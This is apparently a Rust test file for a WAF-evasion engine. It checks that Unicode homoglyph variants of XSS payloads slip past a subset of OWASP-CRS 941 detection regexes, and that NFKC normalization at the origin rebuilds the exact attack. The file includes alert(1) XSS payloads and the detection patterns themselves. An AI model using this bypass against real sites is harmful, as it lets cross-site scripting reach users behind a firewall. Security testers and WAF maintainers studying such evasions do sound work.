//! Dogfood proof: the NFKC-preimage homoglyph engine defeats **real OWASP-CRS
//! 941 (XSS) detection regexes**, while an NFKC-normalizing origin reconstructs
//! the exact attack — which the *same* CRS rule would then block.
//!
//! This is the honest "beats a production WAF" claim: a signature/regex WAF
//! (CRS, ModSecurity, most cloud WAF managed rulesets) matches literal ASCII
//! tokens; the homoglyph variant carries none of them; the W3C-recommended NFKC
//! normalization an origin applies collapses it straight back to the attack.

use regex::Regex;
use wafrift_grammar::grammar::nfkc_preimage::{normalize, variants};

/// A faithful subset of OWASP-CRS PARANOIA-1 §941 XSS detection patterns
/// (libinjection-independent regex arm): the `<script>` tag rule (941110), the
/// HTML event-handler rule (941160), and the `javascript:`-scheme rule.
fn crs_941_xss() -> Vec<Regex> {
    vec![
        Regex::new(r"(?i)<script[^>]*>").unwrap(),
        Regex::new(r"(?i)<[^>]+[\s/](?:onerror|onload|onclick|onmouseover|onfocus)\s*=").unwrap(),
        Regex::new(r"(?i)javascript:").unwrap(),
    ]
}

fn crs_blocks(rules: &[Regex], s: &str) -> bool {
    rules.iter().any(|r| r.is_match(s))
}

#[test]
fn nfkc_homoglyphs_defeat_crs941_yet_origin_recovers_attack() {
    let crs = crs_941_xss();
    let attacks = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "<a href=javascript:alert(1)>x</a>",
    ];

    for attack in attacks {
        // 1. The CRS ruleset blocks the plain attack — the WAF is real.
        assert!(
            crs_blocks(&crs, attack),
            "CRS-941 subset failed to block the plain attack {attack:?} — fix the test fixture, not the engine"
        );

        let vs = variants(attack, 32);
        assert!(!vs.is_empty(), "engine produced no variants for {attack:?}");

        // 2. At least one homoglyph variant evades EVERY CRS rule…
        let bypass = vs.iter().find(|v| !crs_blocks(&crs, v)).unwrap_or_else(|| {
            panic!("no NFKC variant evaded CRS-941 for {attack:?}");
        });

        // 3. …and the NFKC-normalizing origin reconstructs the EXACT attack,
        //    which the SAME CRS rule now blocks — proving the bypassed value
        //    genuinely IS the attack, not an inert lookalike.
        let origin_view = normalize(bypass);
        assert_eq!(
            origin_view, attack,
            "origin NFKC must recover the exact attack bytes"
        );
        assert!(
            crs_blocks(&crs, &origin_view),
            "post-NFKC origin view must re-trigger CRS (it is the attack)"
        );
    }
}

#[test]
fn every_variant_that_bypasses_still_folds_to_the_attack() {
    // Stronger: EVERY variant that evades CRS must be a true NFKC-equivalent.
    // No variant may bypass the WAF by being something OTHER than the attack.
    let crs = crs_941_xss();
    for attack in ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"] {
        for v in variants(attack, 32) {
            if !crs_blocks(&crs, &v) {
                assert_eq!(
                    normalize(&v),
                    attack,
                    "a CRS-bypassing variant {v:?} did NOT fold to the attack — unsound"
                );
            }
        }
    }
}
